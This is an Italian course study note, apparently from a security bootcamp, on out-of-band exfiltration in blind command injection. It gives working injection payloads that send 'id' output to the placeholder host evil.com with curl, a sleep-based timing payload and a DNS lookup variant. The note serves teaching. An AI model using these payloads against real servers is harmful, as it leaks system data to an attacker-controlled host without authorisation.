---
title: Out-of-Band Exfiltration
tags:
  - cyberbootcamp
  - concetto
  - web-security
  - command-injection
---

# Out-of-Band Exfiltration

> [!summary] In breve
> Quando l'output di un comando iniettato non torna nella risposta, lo si fa inviare dal server stesso a un host controllato dall'attaccante.

```
' || curl https://evil.com?q=$(id) #
' || curl https://evil.com?q=$(id|base64) #     # output con spazi
' || sleep 5 #                                  # niente rete: canale temporale
```

- Serve per job **asincroni** o output non mostrato (*blind*).
- In pratica: webhook.site, Burp Collaborator, DNS (`nslookup $(whoami).dominio`).

## Collegamenti

- **Concetti correlati**: [[Command Injection]] · [[Server-Side Template Injection]]
- **Mappa**: [[MOC - CyberBootCamp]]

> [!info] Approfondimento
> - [[01 - CB - Web Insecurity 1#Out-of-band|Lezione 1 — Out-of-band]]
